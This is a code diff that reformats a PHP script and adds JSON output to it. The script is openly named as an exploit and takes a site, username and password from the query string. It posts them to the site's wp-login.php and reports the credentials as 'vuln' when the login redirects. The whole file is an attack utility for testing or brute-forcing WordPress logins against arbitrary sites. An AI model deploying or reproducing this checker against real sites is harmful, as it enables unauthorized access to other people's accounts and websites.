@@ -1,7 +1,10 @@
 <?php
-function exploit($url,$user,$pass){
+
+header('Content-type: application/json');
+function exploit($url, $user, $pass)
+{
 	$setopt = array(
-		CURLOPT_URL => $url.'/wp-login.php',
+		CURLOPT_URL => $url . '/wp-login.php',
 		CURLOPT_RETURNTRANSFER => true,
 		CURLOPT_POSTFIELDS => "log=$user&pwd=$pass&wp-submit=LogIn&redirect_to=$url/wp-admin/",
 		CURLOPT_TIMEOUT => 60,
@@ -21,33 +24,27 @@ if (!empty($_GET['site']) && !empty($_GET['user']) && !empty($_GET['pass'])) {
 	$site = htmlspecialchars($_GET['site']);
 	$user = htmlspecialchars($_GET['user']);
 	$pass = htmlspecialchars($_GET['pass']);
-	if(!preg_match('#^http(s)?://#',$site)){
-		$url = "http://".$site;
-	}
-	else {
+	if (!preg_match('#^http(s)?://#', $site)) {
+		$url = "http://" . $site;
+	} else {
 		$url = $site;
 	}
-	$exploit = exploit($url,$user,$pass);
+	$exploit = exploit($url, $user, $pass);
 	if ($exploit == 302) {
 		$api['url'] = $url;
 		$api['user'] = $user;
 		$api['pass'] = $pass;
 		$api['exploit'] = 'vuln';
-		echo json_encode($api);
-	}
-	else {
+		echo json_encode($api, JSON_PRETTY_PRINT);
+	} else {
 		$api['url'] = $url;
 		$api['exploit'] = 'failed';
-		echo json_encode($api);
+		echo json_encode($api, JSON_PRETTY_PRINT);
 	}
-}
-else if (empty($_GET['site'])) {
+} else if (empty($_GET['site'])) {
 	echo 'Site Empty';
-}
-else if (empty($_GET['user'])) {
+} else if (empty($_GET['user'])) {
 	echo 'User Empty';
-}
-else if (empty($_GET['pass'])) {
+} else if (empty($_GET['pass'])) {
 	echo 'Pass Empty';
 }
-?>
